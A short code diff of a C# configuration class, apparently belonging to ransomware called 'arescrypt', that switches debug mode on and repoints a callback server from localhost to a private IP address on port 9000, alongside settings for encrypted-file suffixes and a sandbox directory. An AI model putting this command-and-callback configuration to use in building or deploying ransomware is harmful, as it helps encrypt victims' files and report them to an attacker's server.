@@ -12,7 +12,7 @@
         // Debugging configuration
         public bool sandBox = true; // Safemode for testing/debugging
         public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
-        public bool debugMode = false; // Debug mode will enable/disable display of the Debug Console/GUI
+        public bool debugMode = true; // Debug mode will enable/disable display of the Debug Console/GUI
 
         // Encryption/Decryption configuration
         public string encryptedFileSuffix = ".enc";
@@ -27,7 +27,7 @@
         public static string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
         // Variables to be set by GetDATFileData()
         // Server Data
-        public static string callbackServer = "localhost";
+        public static string callbackServer = "172.16.1.34";
         public static int callbackPort = 0x2328; // 9000
         public static string callbackURL = "http://" + callbackServer + "/arescrypt.php";
     }
